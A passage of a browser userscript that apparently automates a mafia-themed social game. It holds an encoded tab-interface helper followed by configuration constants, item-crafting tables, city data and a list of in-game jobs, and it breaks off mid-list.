    "LnRhYnBvc2l0aW9uPWkgLy9yZW1lbWJlciBwb3NpdGlvbiBvZiB0YWIgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQlpZiAodGhpcy50YWJzW2ldLmdldEF0dHJpYnV0ZSgicmVsIikpew0KCQkJCXZhciB0YWJp" +
    "bnN0YW5jZT10aGlzDQoJCQkJdGhpcy5ob3R0YWJzcG9zaXRpb25zW3RoaXMuaG90dGFic3Bvc2l0aW9ucy5sZW5ndGhdPWkgLy9zdG9yZSBwb3NpdGlvbiBvZiAiaG90IiB0YWIgKCJyZWwiIGF0dHIgZGVmaW5l" +
    "ZCkgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQkJdGhpcy5zdWJjb250ZW50aWRzW3RoaXMuc3ViY29udGVudGlkcy5sZW5ndGhdPXRoaXMudGFic1tpXS5nZXRBdHRyaWJ1dGUoInJlbCIpIC8vc3RvcmUgaWQg" +
    "b2Ygc3ViIGNvbnRlbnQgKCJyZWwiIGF0dHIgdmFsdWUpDQoJCQkJdGhpcy50YWJzW2ldLm9uY2xpY2s9ZnVuY3Rpb24oKXsNCgkJCQkJdGFiaW5zdGFuY2UuZXhwYW5kdGFiKHRoaXMpDQoJCQkJCXRhYmluc3Rh" +
    "bmNlLmNhbmNlbGF1dG9ydW4oKSAvL3N0b3AgYXV0byBjeWNsaW5nIG9mIHRhYnMgKGlmIHJ1bm5pbmcpDQoJCQkJCXJldHVybiBmYWxzZQ0KCQkJCX0NCgkJCQlpZiAodGhpcy50YWJzW2ldLmdldEF0dHJpYnV0" +
    "ZSgicmV2IikpeyAvL2lmICJyZXYiIGF0dHIgZGVmaW5lZCwgc3RvcmUgZWFjaCB2YWx1ZSB3aXRoaW4gInJldiIgYXMgYW4gYXJyYXkgZWxlbWVudA0KCQkJCQl0aGlzLnJldmNvbnRlbnRpZHM9dGhpcy5yZXZj" +
    "b250ZW50aWRzLmNvbmNhdCh0aGlzLnRhYnNbaV0uZ2V0QXR0cmlidXRlKCJyZXYiKS5zcGxpdCgvXHMqLFxzKi8pKQ0KCQkJCX0NCgkJCQlpZiAoc2VsZWN0ZWR0YWJmcm9tdXJsPT1pIHx8IHRoaXMuZW5hYmxl" +
    "dGFicGVyc2lzdGVuY2UgJiYgc2VsZWN0ZWR0YWI9PS0xICYmIHBhcnNlSW50KHBlcnNpc3RlZHRhYik9PWkgfHwgIXRoaXMuZW5hYmxldGFicGVyc2lzdGVuY2UgJiYgc2VsZWN0ZWR0YWI9PS0xICYmIHRoaXMu" +
    "Z2V0c2VsZWN0ZWRDbGFzc1RhcmdldCh0aGlzLnRhYnNbaV0pLmNsYXNzTmFtZT09InNlbGVjdGVkIil7DQoJCQkJCXNlbGVjdGVkdGFiPWkgLy9TZWxlY3RlZCB0YWIgaW5kZXgsIGlmIGZvdW5kDQoJCQkJfQ0K" +
    "CQkJfQ0KCQl9IC8vRU5EIGZvciBsb29wDQoJCWlmIChzZWxlY3RlZHRhYiE9LTEpIC8vaWYgYSB2YWxpZCBkZWZhdWx0IHNlbGVjdGVkIHRhYiBpbmRleCBpcyBmb3VuZA0KCQkJdGhpcy5leHBhbmR0YWIodGhp" +
    "cy50YWJzW3NlbGVjdGVkdGFiXSkgLy9leHBhbmQgc2VsZWN0ZWQgdGFiIChlaXRoZXIgZnJvbSBVUkwgcGFyYW1ldGVyLCBwZXJzaXN0ZW50IGZlYXR1cmUsIG9yIGNsYXNzPSJzZWxlY3RlZCIgY2xhc3MpDQoJ" +
    "CWVsc2UgLy9pZiBubyB2YWxpZCBkZWZhdWx0IHNlbGVjdGVkIGluZGV4IGZvdW5kDQoJCQl0aGlzLmV4cGFuZHRhYih0aGlzLnRhYnNbdGhpcy5ob3R0YWJzcG9zaXRpb25zWzBdXSkgLy9KdXN0IHNlbGVjdCBm" +
    "aXJzdCB0YWIgdGhhdCBjb250YWlucyBhICJyZWwiIGF0dHINCgkJaWYgKHBhcnNlSW50KHRoaXMuYXV0b21vZGVwZXJpb2QpPjUwMCAmJiB0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVuZ3RoPjEpew0KCQkJdGhp" +
    "cy5hdXRvcnVudGltZXI9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXt0YWJpbnN0YW5jZS5hdXRvcnVuKCl9LCB0aGlzLmF1dG9tb2RlcGVyaW9kKQ0KCQl9DQoJfSAvL0VORCBpbnQoKSBmdW5jdGlvbg0KDQp9IC8v" +
    "RU5EIFByb3RvdHlwZSBhc3NpZ25tZW50";

  var settingsOpen = false;
  var statsOpen = false;
  var scratchpad = document.createElement('textarea');
  var defaultClans = ['{', '[', '(', '<', '\u25C4', '?', '\u2122', '\u03A8', '\u039E'];
  var defaultSecretStashes = ['Properties', 'Collection Item', 'Siberian Tiger'];
  var defaultPassPatterns = ['LOST', 'punched', 'Whacked', 'you were robbed', 'ticket'];
  var defaultFailPatterns = ['WON','heal','help','properties','upgraded'];
  var keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

  var debug = isGMChecked('enableDebug');
  var filter = isGMChecked('filterLog');

  // Regular expression for cash matching.
  const REGEX_CASH = /[A-Z]?\$[\d,]*\d/;

  // Define how stamina can be used.
  const STAMINA_HOW_FIGHT_RANDOM    = 0; // Random fighting.
  const STAMINA_HOW_FIGHT_LIST      = 1; // List fighting.
  const STAMINA_HOW_HITMAN          = 2; // Hitman.
  const STAMINA_HOW_ROBBING         = 3; // Robbing
  const STAMINA_HOW_AUTOHITLIST     = 4; // Place bounties.
  const STAMINA_HOW_RANDOM          = 5; // Random spending of stamina in random cities.
  const STAMINA_HOW_FIGHTROB        = 6; // Fight then Rob random opponents.
  const STAMINA_HOW_FIGHT_RIVALS    = 7; // Rival fighting.
  const STAMINA_HOW_FIGHTRIVALS_ROB = 8; // Fight Rivals then Rob random opponents.
//  const STAMINA_HOW_LVJOBFIGHT   = 8;  // do lv job Fights.
//newchange_fight

  var staminaSpendChoices = [];
  staminaSpendChoices[STAMINA_HOW_FIGHT_RANDOM]    = 'Fight random opponents';
  staminaSpendChoices[STAMINA_HOW_FIGHT_LIST]      = 'Fight specific opponents';
  staminaSpendChoices[STAMINA_HOW_HITMAN]          = 'Collect hitlist bounties';
  staminaSpendChoices[STAMINA_HOW_ROBBING]         = 'Rob random opponents';
  staminaSpendChoices[STAMINA_HOW_AUTOHITLIST]     = 'Place hitlist bounties';
  staminaSpendChoices[STAMINA_HOW_RANDOM]          = 'Spend stamina randomly';
  staminaSpendChoices[STAMINA_HOW_FIGHTROB]        = 'Fight then Rob';
  staminaSpendChoices[STAMINA_HOW_FIGHT_RIVALS]    = 'Fight rivals';
  staminaSpendChoices[STAMINA_HOW_FIGHTRIVALS_ROB] = 'Fight Rivals then Rob';
//  staminaSpendChoices[STAMINA_HOW_LVJOBFIGHT]   = 'Do LV Job Fights';
//newchange_fight

  var randomSpendChoices = [];
  randomSpendChoices[STAMINA_HOW_FIGHT_RANDOM] = 'Fight random';
  randomSpendChoices[STAMINA_HOW_FIGHT_LIST]   = 'Fight specific';
  randomSpendChoices[STAMINA_HOW_HITMAN]       = 'Collect bounties';
  randomSpendChoices[STAMINA_HOW_ROBBING]      = 'Rob random';
  //randomSpendChoices[STAMINA_HOW_AUTOHITLIST]     = 'Place hitlist bounties';
  randomSpendChoices[STAMINA_HOW_FIGHT_RIVALS] = 'Fight rivals';

  // Define Bounty Selection options
  const BOUNTY_SHORTEST_TIME  = 0; // Select qualified bounties with shortest time.
  const BOUNTY_LONGEST_TIME   = 1; // Select qualified bounties with longest time on the hitlist.
  const BOUNTY_HIGHEST_BOUNTY = 2; // Select qualified bounties with the highest bounty.
  const BOUNTY_EXACT_AMOUNT   = 3; // Select qualified bounties with exact dollar amount.
  const BOUNTY_RANDOM         = 4; // Select random qualified bounty.
  var bountySelectionChoices = [];
  bountySelectionChoices[BOUNTY_SHORTEST_TIME]  = 'Shortest time';
  bountySelectionChoices[BOUNTY_LONGEST_TIME]   = 'Longest time';
  bountySelectionChoices[BOUNTY_HIGHEST_BOUNTY] = 'Highest bounty';
  bountySelectionChoices[BOUNTY_EXACT_AMOUNT]   = 'Exact dollar amount';
  bountySelectionChoices[BOUNTY_RANDOM]         = 'No preference (random)';

  // Define war modes
  const WAR_HOW_RANDOM = 0; // Random war.
  const WAR_HOW_LIST   = 1; // List warring
  var warModeChoices = ['War a random Enemy', 'War Enemies from a list'];

  // Define AutoStat allocation mode
  const AUTOSTAT_TARGET        = 0;
  const AUTOSTAT_RATIO_LEVEL   = 1;
  const AUTOSTAT_RATIO_ATTACK  = 2;
  const AUTOSTAT_RATIO_DEFENSE = 3;
  const AUTOSTAT_RATIO_HEALTH  = 4;
  const AUTOSTAT_RATIO_ENERGY  = 5;
  const AUTOSTAT_RATIO_STAMINA = 6;

  // Auto Stat mode arrays
  var autoStatDescrips  = ['Level', 'Attack', 'Defense', 'Health', 'Energy', 'Stamina'];
  var autoStatModes     = ['autoStatAttackMode', 'autoStatDefenseMode', 'autoStatHealthMode',
                           'autoStatEnergyMode', 'autoStatStaminaMode'];
  var autoStatPrios     = ['autoStatAttackPrio', 'autoStatDefensePrio', 'autoStatHealthPrio',
                           'autoStatEnergyPrio', 'autoStatStaminaPrio'];
  var autoStatFallbacks = ['autoStatAttackFallback', 'autoStatDefenseFallback', 'autoStatHealthFallback',
                           'autoStatEnergyFallback', 'autoStatStaminaFallback'];
  var autoStatBases     = ['autoStatAttackBase', 'autoStatDefenseBase', 'autoStatHealthBase',
                           'autoStatEnergyBase', 'autoStatStaminaBase'];
  var autoStatRatios    = ['autoStatAttackRatio', 'autoStatDefenseRatio', 'autoStatHealthRatio',
                           'autoStatEnergyRatio', 'autoStatStaminaRatio'];

  // Number Scheme
  const SCHEME_PERCENT = 0;
  const SCHEME_POINTS = 1;

  var numberSchemes = ['percent','points'];

  // Burn constants
  const BURN_ENERGY = 0;
  const BURN_STAMINA = 1;
  var burnModes = ['Energy','Stamina'];

  // Array of lottery bonus items
  var autoLottoBonusList = ['A random collection item', 'A free ticket', '+5 stamina points', 'two free lotto tickets', '+20 energy points', '20 Loyalty points'];

  // Stat Ordinal constants
  const ATTACK_STAT  = 0;
  const DEFENSE_STAT = 1;
  const HEALTH_STAT  = 2;
  const ENERGY_STAT  = 3;
  const STAMINA_STAT = 4;

  // Define city variables.
  const NY      = 0;
  const CUBA    = 1;
  const MOSCOW  = 2;
  const BANGKOK = 3;
  const LV      = 4;
  const ITALY   = 5;
  const ACTIVE_CITY = 6;
  const RANDOM_CITY = 7;

  // Constants to access city attributes
  const CITY_NAME        = 0;
  const CITY_ALIAS       = 1;
  const CITY_SIDES       = 2;
  const CITY_SIDE_NAME   = 3;
  const CITY_CASH        = 4;
  const CITY_LEVEL       = 5;
  const CITY_CASH_ICON   = 6;
  const CITY_CASH_CSS    = 7;
  const CITY_AUTOBANK    = 8;
  const CITY_BANKCONFG   = 9;
  const CITY_CASH_SYMBOL = 10;
  const CITY_ALLIANCE    = 11;

  // Constants for accessing mission array
  const MISSION_NAME     = 0; // 7
  const MISSION_ENERGY   = 1; // 5
  const MISSION_NUMBER   = 2; // 4
  const MISSION_TAB      = 3; // 2
  const MISSION_CITY     = 4; // 1
  const MISSION_XP       = 5; // 6
  const MISSION_TABPATH  = 6; // 3
  const MISSION_NODE_LV  = 7; // 0 node line for Las Vegas
  const MISSION_RATIO    = 8; // 8
  const MISSION_EOL      = 9; // 9

  // Constants for accessing mafia mission array
  const MMiss_ID           =  0; //
  const Mmiss_Slot         =  1; //
  const Mmiss_Percent_Fin  =  2; //
  const Mmiss_Nrg_Use      =  3; //
  const Mmiss_Stam_Use     =  4; //
  const Mmiss_XP           =  5; //
  const Mmiss_Pays         =  6; //
  const Mmiss_Ratio        =  7; //
  const Mmiss_Onr          =  8; //
  const Mmiss_Onr_ID       =  9; //
  const Mmiss_ONR_FB       = 10; //
  const Mmiss_Timer        = 11; //
  const Mmiss_Name         = 12; //

  // for mafia missions
  var MMiss = new Array ();

  // Add city variables in this format
  // Name, Alias, Sides (if any), Cash, Level Req, Icon, Icon CSS, Autobank config, Min cash config, Sell Crates config, Cash Symbol, Alliance Point Threshold
  // Array container for city variables
  var cities = new Array(
    ['New York', 'nyc', [], 'sideNY', undefined, 0, cashIcon, 'cash Icon', 'autoBank', 'bankConfig', '$', 0],
    ['Cuba', 'cuba', [], 'sideCuba', undefined, 35, cashCubaIcon, 'cashCuba Icon', 'autoBankCuba', 'bankConfigCuba', 'C$', 0],
    ['Moscow', 'moscow', ['Vory','Mafiya'], 'sideMoscow', undefined, 70, cashMoscowIcon, 'cashMoscow Icon', 'autoBankMoscow', 'bankConfigMoscow', 'R$', 0],
    ['Bangkok', 'bangkok', ['Yakuza','Triad'], 'sideBangkok', undefined, 18, cashBangkokIcon, 'cashBangkok Icon', 'autoBankBangkok', 'bankConfigBangkok', 'B$', 50],
    ['Las Vegas', 'vegas', [], 'sideVegas', undefined, 18, cashVegasIcon, 'cashVegas Icon', 'autoBankVegas', 'bankConfigVegas', 'V$', 0],
    ['Italy', 'italy', [], 'sideItaly', undefined, 5, cashItalyIcon, 'cashItaly Icon', 'autoBankItaly', 'bankConfigItaly', 'L$', 0]
  );

  var locations = ['New York','Cuba','Moscow','Bangkok','Las Vegas','Italy','Active City'];
  var fightLocations = ['New York','Cuba','Moscow','Bangkok','Las Vegas','Italy','Active City', 'Random City'];
  var randomLocations = ['New York','Cuba','Moscow','Bangkok','Las Vegas','Italy'];

  // Featured job locations
  var featJobNames = ['Left Job', 'Middle Job', 'Right Job'];

  var allyFaction = '';
  var quickBankFail = false;

  // Chop Shop Build
  var cityCars = new Array (
    ['Midnight', 39, 'Requires 10 car parts, 1 special part | 28 attack, 33 defense, +1 defense'],
    ['Sonic Five', 25, 'Requires 12 car parts | 32 attack, 30 defense'],
    ['Random Common Car', 1, 'Requires 10 car parts'],
    ['Palermo Luxury', 40, 'Requires 20 car parts, 2 special parts | 36 attack, 35 defense, +5 health'],
    ['General Ulysses', 26, 'Requires 28 car parts| 38 attack, 28 defense'],
    ['Random Rare Car', 2, 'Requires 25 car parts'],
    ['Sleek', 41, 'Requires 30 car parts, 3 special parts | 35 attack, 37 defense, +1 attack'],
    ['Tasmanian', 3, 'Requires 30 car parts | 36 attack, 34 defense'],
    ['CM Santiago R10', 4, 'Requires 30 car parts, 2 cuban car parts | 42 attack, 30 defense'],
    ['Sirroco 9Z', 11, 'Requires 48 car parts | 46 attack, 15 defense'],
    ['Rebel 2', 5, 'Requires 45 car parts, 1 bulletproof glass | 40 attack, 45 defense, +6 stamina'],
    ['Russian Dazatz 45', 6, 'Requires 50 car parts, 2 russian car parts | 18 attack, 46 defense'],
    ['Andresen 420si', 12, 'Requires 68 car parts | 41 attack, 43 defense'],
    ['Solar Flare', 7, 'Requires 65 car parts, 1 solar panel | 34 attack, 34 defense, +6 energy'],
    ['Thai XS Max', 8, 'Requires 75 car parts, 2 thai car parts | 45 attack, 35 defense'],
    ['Trio Napoli', 9, 'Requires 95 car parts | 47 attack, 23 defense'],
    ['Red Angel', 10, 'Requires 115 car parts | 16 attack, 49 defense'],
    ['Mugati Sport', 13, 'Requires 135 car parts, 1 high tech car part | 35 attack, 51 defense, +3 attack'],
    ['Hunter \'Spy\' XS', 14, 'Requires 155 car parts, 2 high tech car parts | 52 attack, 29 defense, +3 defense'],
    ['Day Rider 2K', 27, 'Requires 175 car parts, 1 suspension coil | 45 attack, 50 defense, +1 attack, +1 defense'],
    ['Sportster', 42, 'Requires 185 car parts, 10 special parts | 52 attack, 46 defense, +3 energy, +3 stamina'],
    ['Extended Cab 640', 43, 'Requires 200 car parts, 15 special parts | 53 attack, 55 defense, +3 skill points']
  );

  var cityShopParts = new Array (
    ['Cement Block', 532],
    ['Power Tool', 533],
    ['Car Lift', 534],
    ['Acytelene Torch', 535],
    ['Shipping Container', 536]
  );

  // Weapons build
  var cityWeapons = new Array (
    ['Random Common Weapon', 15, 'Requires 3 weapon parts'],
    ['Random Uncommon Weapon', 16, 'Requires 9 weapon parts'],
    ['Random Rare Weapon', 17, 'Requires 15 weapon parts'],
    ['Ninja Sai', 18, 'Requires 24 weapon parts | 30 attack, 40 defense'],
    ['First Blood', 19, 'Requires 30 weapon parts and 1 explosive arrow | 49 attack, 13 defense'],
    ['Ultrasonic Gun', 20, 'Requires 36 weapon parts and 1 sonic emitter | 22 attack, 48 defense'],
    ['Lazer Guided RPG', 21, 'Requires 63 weapon parts and 1 laser rangefinder | 37 attack, 42 defense'],
    ['Robber\'s Utility Belt', 22, 'Requires 72 weapon parts, 1 boomerang and 1 grapple | 33 attack, 41 defense, +6 stamina'],
    ['Railgun', 23, 'Requires 81 weapon parts and 1 railgun barrel | 51 attack, 24 defense, +5 attack'],
    ['Plasma Rifle', 24, 'Requires 105 weapon parts and 1 portable fusion reactor | 40 attack, 47 defense, +5 defense'],
    ['Dirty Trick', 44, 'Requires 110 weapon parts and 3 special parts | 45 attack, 49 defense, +5 health, +2 stamina'],
    ['Electric Prod', 45, 'Requires 115 weapon parts and 6 special parts | 50 attack, 50 defense, +5 health, +2 energy'],
    ['Hack Blade', 46, 'Requires 120 weapon parts and 9 special parts | 45 attack, 51 defense, +6 defense'],
    ['Stun Knuckles', 47, 'Requires 125 weapon parts and 12 special parts | 52 attack, 48 defense, +6 attack'],
    ['Wasper Knife', 48, 'Requires 130 weapon parts and 15 special parts | 51 attack, 51 defense, +4 skill points']
  );

  var cityDepotParts = new Array (
    ['Forge', 660],
    ['Arc Welder', 656],
    ['Buzzsaw', 657],
    ['Gunpowder', 658],
    ['Gun Drill', 659]
  );

  // Armory build
  var cityArmor = new Array (
    ['Random Common Armor', 29, 'Requires 2 armor parts'],
    ['Random Uncommon Armor', 30, 'Requires 5 armor parts'],
    ['Random Rare Armor', 31, 'Requires 14 armor parts'],
    ['Plastic Legging', 32, 'Requires 18 armor parts | 33 attack, 41 defense'],
    ['Mariner\'s Suit ', 33, 'Requires 22 armor parts | 43 attack, 39 defense'],
    ['Pressure Suit', 34, 'Requires 28 armor parts | 45 attack, 40 defense'],
    ['Sleek Torso Guard ', 35, 'Requires 35 armor parts | 44 attack, 46 defense'],
    ['Full Body Armor ', 36, 'Requires 38 armor parts | 47 attack, 40 defense, +1 attack, +1 defense'],
    ['MNU Suit', 37, 'Requires 42 armor parts and 1 bio-monitor | 31 attack, 50 defense, +10 health'],
    ['Power Armor ', 38, 'Requires 48 armor parts and 1 micro-fission cell | 43 attack, 53 defense, +2 energy, +2 stamina']
  );

  var cityArmorParts = new Array (
    ['Hammer', 2196],
    ['Rivet', 2197],
    ['Furnace', 2183],
    ['Vice', 2184],
    ['Anvil', 2185]
  );

  // Animal build
  var cityAnimals = new Array (
    ['Fennec Fox', 60, 'Requires 4 animal feed | 25 attack, 36 defense'],
    ['Spur Tortoise', 61, 'Requires 8 animal feed | 26 attack, 43 defense'],
    ['Philippine Eagle', 62, 'Requires 12 animal feed | 48 attack, 31 defense'],
    ['Bobcat', 63, 'Requires 16 animal feed | 42 attack, 49 defense'],
    ['Secretary Raptor', 64, 'Requires 20 animal feed | 51 attack, 40 defense'],
    ['Brown Recluse Spider', 65, 'Requires 24 animal feed | 53 attack, 41 defense'],
    ['Tiger Shark', 66, 'Requires 28 animal feed and 1 exotic animal feed | 50 attack, 48 defense, +3 attack'],
    ['Black Mamba', 67, 'Requires 32 animal feed and 1 exotic animal feed | 45 attack, 52 defense, +1 skill point'],
    ['Gharial', 68, 'Requires 36 animal feed and 2 exotic animal feed | 48 attack, 57 defense, +3 defense'],
    ['Warthog', 69, 'Requires 40 animal feed and 3 exotic animal feed | 62 attack, 50 defense, +20 health']
  );

  var cityZooParts = new Array (
    ['Aquarium', 4605],
    ['Big Cage', 4606],
    ['Bird Cage', 4607],
    ['Feeding Trough', 4608],
    ['Terrarium', 4609]
  );

  // Port build
  var cityPort = new Array (
    ['Escalation', 2635, 'Requires L$63,000 | 47 attack, 37 defense'],
    ['Officer\'s Jacket', 2636, 'Requires L$71,000 | 48 attack, 40 defense'],
    ['Osprey', 2637, 'Requires L$81,000 | 52 attack, 24 defense'],
    ['Conchiglia', 2638, 'Requires L$132,000 | 35 attack, 55 defense, +1 energy'],
    ['Coccodrillo', 2639, 'Requires L$144,000 | 57 attack, 40 defense, +1 stamina'],
    ['Un Tuono', 2640, 'Requires L$148,000 | 60 attack, 49 defense'],
    ['Water Truck', 2641, 'Requires L$164,000 | 45 attack, 64 defense, +5 health'],
    ['Antiproiettil', 2642, 'Requires L$170,000 | 66 attack, 52 defense'],
    ['Bolla', 2643, 'Requires L$203,000 | 68 attack, 55 defense, +2 attack'],
    ['Fanteria', 2644, 'Requires L$254,000 | 23 attack, 71 defense, +2 defense'],
    ['Raven', 2659,'Requires L$250000 | 53 attack, 69 defense, +1 energy'],
    ['Pitch Car', 2660,'Requires L$266000 | 50 attack, 70 defense, +1 attack'],
    ['Pesce Spada', 2661,'Requires L$290000 | 71 attack, 35 defense, +1 stamina'],
    ['Pair of Armored Shoulder Pads', 2662,'Requires L$310000 | 43 attack, 71 defense, +1 defense'],
    ['Good Neighbor', 2658,'Requires L$232000 | 70 attack, 47 defense, +5 health'],
    ['Lantern Fish', 2663,'Requires L$950000 | 72 attack, 51 defense, +2 energy'],
    ['Pirahna XE', 2664,'Requires L$1000000 | 72 attack, 55 defense, +1 attack']
  );

  var cityCasinoParts = new Array (
    ['Slot Machine', 1574, 1],
    ['Cinder Block', 1575, 1],
    ['Steel Girder', 1576, 1],
    ['Concrete', 1577, 1],
    ['Construction Tool', 1578, 1],
    ['Casino Dealer', 1579, 2],
    ['Chef', 1580 ,3],
    ['Poker Table', 1581, 4],
    ['Bellhop', 1582, 5]
  );

  var cityVillageParts = new Array (
    ['Volcanic Bricks', 1574, 1],
    ['Wine Barrel', 1574, 1],
    ['Motor Oil', 1574, 1],
    ['Fishing Net', 1574, 1],
    ['Football Player', 1574, 1],
    ['Italian Hardwood', 1574, 1],
    ['Marble Slab', 1574, 1],
    ['Stone Column', 1574, 1],
    ['Terracotta Tiles', 1574, 1]
  );

  // Tournament Classes
  // Format: long description, short description, min mafia, max xp
  var tournamentClasses = new Array (
    ['Flyweight Tournament', 'Flyweight', 1, 200],
    ['Bantamweight Tournament', 'Bantamweight', 25, 300],
    ['Featherweight Tournament', 'Featherweight', 50, 400],
    ['Lightweight Tournament', 'Lightweight', 100, 600],
    ['Welterweight Tournament', 'Welterweight', 150, 800],
    ['Middleweight Tournament', 'Middleweight', 250, 932],
    ['Cruiserweight Tournament', 'Cruiserweight', 350, 1064],
    ['Heavyweight Tournament', 'Heavyweight', 501, 1200]
  );

  // Las Vegas vault levels
  var vaultLevels = new Array (
    ['Vault handling disabled', 0],
    ['0.5 stars (V$100,000)', 100000],
    ['1.0 stars (V$200,000)', 200000],
    ['1.5 stars (V$400,000)', 400000],
    ['2.0 stars (V$800,000)', 800000],
    ['2.5 stars (V$1,500,000)', 1500000],
    ['3.0 stars (V$3,000,000)', 3000000],
    ['3.5 stars (V$5,000,000)', 5000000],
    ['4.0 stars (V$10,000,000)', 10000000],
    ['4.5 stars (V$20,000,000)', 20000000],
    ['5.0 stars (V$50,000,000)', 50000000]
  );

  // Flash Check
  const FLASH_UNDEFINED = -1;
  const FLASH_ENABLED = 1;
  const FLASH_DISABLED = 0;
  var isFlashed = FLASH_UNDEFINED;

  // Gift Accept Choices/Rewards
  var giftAcceptChoices = ['Help', 'Sabotage'];
  var giftAcceptRewards = ['Energy', 'Stamina'];

  // Spend objects
  var SpendStamina = new Spend ('Stamina', 'staminaSpend', 'useStaminaStarted',
                                'selectStaminaKeepMode', 'selectStaminaKeep',
                                'selectStaminaUseMode', 'selectStaminaUse', staminaIcon,
                                'allowStaminaToLevelUp', 'staminaFloorLast', 'staminaCeilingLast');

  var SpendEnergy  = new Spend ('Energy', 'autoMission', 'useEnergyStarted',
                                'selectEnergyKeepMode', 'selectEnergyKeep',
                                'selectEnergyUseMode', 'selectEnergyUse', energyIcon,
                                'allowEnergyToLevelUp', 'energyFloorLast', 'energyCeilingLast');
//needchange
  var SpendMissionEnergy  = new Spend (
                                'MissionEnergy', 'autoMissionMission', 'useMissionEnergyStarted',
                                'selectMissionEnergyKeepMode', 'selectMissionEnergyKeep',
                                'selectMissionEnergyUseMode', 'selectMissionEnergyUse', energyIcon,
                                'allowMissionEnergyToLevelUp', 'MissionenergyFloorLast', 'MissionenergyCeilingLast'
                                );

  var SpendMissionStamina = new Spend (
                                'MissionStamina', 'MissionStaminaSpend', 'useMissionStaminaStarted',
                                'selectMissionStaminaKeepMode', 'selectMissionStaminaKeep',
                                'selectMissionStaminaUseMode', 'selectMissionStaminaUse', staminaIcon,
                                'allowMissionStaminaToLevelUp', 'MissionStaminaFloorLast', 'MissionStaminaCeilingLast'
                                );

  // Force Heal options
  var healOptions = new Array(
    ['forceHealOpt7','Heal if Health is above 19','check to allow healing while health is above 19, Overrides ALL Lower Settings'],
    ['forceHealOpt5','Heal after 5 minutes','if health drops below 20, start a 5 minute timer, Then allow healing'],
    ['forceHealOpt4','Heal if stamina is full','allow healing if stamina is full and not blocked from above choices'],
    ['forceHealOpt3','Heal if stamina can be spent','try to heal. overridden by the top 2 choices']
  );

  // Define all jobs. The array elements are:
  // job description0,         energycost1, jobno2, jobtabno3, city4, exppay5, tabpath6, node7, ratio8, EOL job9
  //   0                                                    1   2 3    4      5 6    7   8 9//
  var missions = new Array(
    ['Chase Away Thugs'                                  ,  1,  1,1,NY     ,  1,0,'     ',,1],
    ['Rob a Drug Runner'                                 ,  3,  2,1,NY     ,  3,0,'     ',,1],
    ['Rough Up Dealers'                                  ,  5,  3,1,NY     ,  5,0,'     ',,1],
    ['Rob the Warehouse'                                 ,  7,  4,1,NY     ,  8,0,'     ',,1],
    ['Collect Protection Money'                          ,  2,  5,1,NY     ,  2,0,'     ',,1],
    ['Grow Your Family'                                  ,  3,  8,1,NY     ,  3,0,'     ',,1],
    ['Perform a Hit'                                     ,  2, 37,1,NY     ,  2,0,'     ',,1],
    ['Mugging'                                           ,  2,  6,2,NY     ,  2,0,'     ',,1],
    ['Auto Theft'                                        ,  2,  7,2,NY     ,  2,0,'     ',,1],
    ['Take Out a Rogue Cop'                              ,  3,  9,2,NY     ,  3,0,'     ',,1],
    ['Collect on a Loan'                                 ,  3, 10,2,NY     ,  3,0,'     ',,1],
    ['Bank Heist'                                        , 10, 11,2,NY     , 13,0,'     ',,1],
    ['Jewelry Store Job'                                 , 15, 12,2,NY     , 20,0,'     ',,1],
    ['Hijack a Semi'                                     ,  8, 38,2,NY     ,  9,0,'     ',,1],
    ['Destroy Enemy Mob Hideout'                         ,  5, 13,3,NY     ,  5,0,'     ',,1],
    ['Kill a Protected Snitch'                           ,  5, 14,3,NY     ,  5,0,'     ',,1],
    ['Bust a Made Man Out of Prison'                     ,  5, 15,3,NY     ,  5,0,'     ',,1],
    ['Asian Museum Break-in'                             , 18, 16,3,NY     , 22,0,'     ',,1],
    ['Fight a Haitian Gang'                              ,  6, 17,3,NY     ,  6,0,'     ',,1],
    ['Clip the Irish Mob\'s Local Enforcer'              , 10, 39,3,NY     , 11,0,'     ',,1],
    ['Steal a Tanker Truck'                              ,  8, 40,3,NY     ,  9,0,'     ',,1],
    ['Federal Reserve Raid'                              , 25, 18,4,NY     , 30,0,'     ',,1],
    ['Smuggle Thai Gems'                                 ,  7, 19,4,NY     ,  8,0,'     ',,1],
    ['Liquor Smuggling'                                  , 30, 22,4,NY     , 35,0,'     ',,1],
    ['Run Illegal Poker Game'                            , 20, 26,4,NY     , 33,0,'     ',,1],
    ['Wiretap the Cops'                                  , 30, 28,4,NY     , 45,0,'     ',,1],
    ['Rob an Electronics Store'                          , 24, 41,4,NY     , 26,0,'     ',,1],
    ['Burn Down a Tenement'                              , 18, 42,4,NY     , 22,0,'     ',,1],
    ['Distill Some Liquor'                               , 10, 23,4,NY     , 12,0,'     ',,1],
    ['Manufacture Tokens'                                , 10, 24,4,NY     , 12,0,'     ',,1],
    ['Get Cheating Deck'                                 , 10, 25,4,NY     , 12,0,'     ',,1],
    ['Overtake Phone Central'                            , 10, 27,4,NY     , 12,0,'     ',,1],
    ['Repel the Yakuza'                                  , 13, 29,5,NY     , 18,0,'     ',,1],
    ['Disrupt Rival Smuggling Ring'                      , 15, 30,5,NY     , 20,0,'     ',,1],
    ['Invade Tong-controlled Neighborhood'               , 25, 31,5,NY     , 30,0,'     ',,1],
    ['Sell Guns to the Russian Mob'                      , 25, 32,5,NY     , 35,0,'     ',,1],
    ['Protect your City against a Rival Family'          , 35, 33,5,NY     , 50,0,'     ',,1],
    ['Assassinate a Political Figure'                    , 35, 34,5,NY     , 50,0,'     ',,1],
    ['Exterminate a Rival Family'                        , 40, 35,5,NY     , 58,0,'     ',,1],
    ['Obtain Compromising Photos'                        , 28, 43,5,NY     , 32,0,'     ',,1],
    ['Frame a Rival Capo'                                , 26, 44,5,NY     , 33,0,'     ',,1],
    ['Steal an Air Freight Delivery'                     , 32, 45,6,NY     , 36,0,'     ',,1],
    ['Run a Biker Gang Out of Town'                      , 35, 46,6,NY     , 40,0,'     ',,1],
    ['Flip a Snitch'                                     , 25, 47,6,NY     , 30,0,'     ',,1],
    ['Steal Bank Records'                                , 30, 48,6,NY     , 36,0,'     ',,1],
    ['Loot the Police Impound Lot'                       , 60, 49,6,NY     , 60,0,'     ',,1],
    ['Recruit a Rival Crew Member'                       , 30, 50,6,NY     , 39,0,'     ',,1],
    ['Dodge an FBI Tail'                                 , 20, 51,6,NY     , 27,0,'     ',,1],
